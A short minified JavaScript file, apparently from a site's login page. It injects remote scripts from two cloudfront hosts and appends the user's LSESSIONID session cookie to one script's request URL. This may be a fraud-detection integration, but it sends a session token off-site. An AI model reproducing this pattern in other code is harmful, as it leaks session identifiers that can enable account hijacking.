var clt=0;
function getDev(){clt=1;
document.getElementById("clt").value=clt
}function envlope(a){document.getElementById("iscd").value=a
}(function(){var k=window,j=document,h=k.location.protocol,i=j.getElementsByTagName("head")[0],a=j.createElement("script");
a.src=(h=="https:"?"https://":"http://")+"dqnjn206bwvk2.cloudfront.net/321226/fruprem.js?r="+Math.random();
a.async=true;
setTimeout(function(){a.type="text/javascript";
i.appendChild(a)
},0)
})();
var cookie_value=null;
try{cookie_value=document.cookie
}catch(e){}if(cookie_value){var re=new RegExp("(?:^| )(LSESSIONID=.[^;]+)","i"),matches=null;
var result=null;
if(cookie_value.length>0){matches=cookie_value.match(re);
if(matches&&matches.length==2){result=matches[1]
}}}var url="https://d2ydsn9mah1r4u.cloudfront.net/321226/loreo.js";
var s=document.createElement("script");
s.type="text/javascript";
s.async=true;
var extra=["dt=login&r="+Math.random()];
if(result){extra.push(result)
}s.src=[url,extra.join("&")].join("?");
document.getElementsByTagName("head")[0].appendChild(s);